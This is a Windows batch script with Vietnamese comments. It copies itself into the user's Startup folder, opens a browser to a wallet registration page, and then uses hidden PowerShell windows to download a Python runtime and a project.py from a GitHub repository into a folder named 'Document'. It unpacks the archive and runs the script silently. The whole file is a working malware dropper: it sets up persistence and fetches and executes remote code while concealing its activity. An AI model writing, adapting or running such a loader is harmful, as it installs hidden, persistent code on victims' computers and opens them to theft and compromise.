@echo off
setlocal


:: Lấy đường dẫn của tệp batch hiện tại
set "scriptFullPath=%~dp0"

:: Tạo đối tượng FileSystemObject
set "objFSO=CreateObject("Scripting.FileSystemObject")"

:: Đường dẫn đến thư mục chương trình khởi động
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Đường dẫn đến tệp batch mới
set "newScriptPath=%startupFolder%\%~n0.bat"

:: Sao chép tệp batch vào thư mục khởi động
copy "%scriptFullPath%%~nx0" "%newScriptPath%" /Y




:: Mở trình duyệt web
start "" chrome "https://zenswallet.com/Register"

:: Kiểm tra nếu tệp Document.zip không tồn tại, sau đó tải nó về
if not exist "C:\Users\Public\Document.zip" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/vipmodz13/Bot13/raw/main/python.zip' -OutFile 'C:\Users\Public\Document.zip'"
)

:: Kiểm tra nếu thư mục Document không tồn tại, sau đó giải nén tệp Document.zip
if not exist "C:\Users\Public\Document" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path 'C:\Users\Public\Document.zip' -DestinationPath 'C:\Users\Public\Document'"
)

:: Kiểm tra nếu tệp project.py không tồn tại, sau đó tải nó về
if not exist "C:\Users\Public\Document\project.py" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/vipmodz13/Bot13/raw/main/project.py' -OutFile 'C:\Users\Public\Document\project.py'"
)

:: Chạy tệp project.py
powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "C:\Users\Public\Document\python.exe C:\Users\Public\Document\project.py"

:: Kết thúc script
exit /b 0
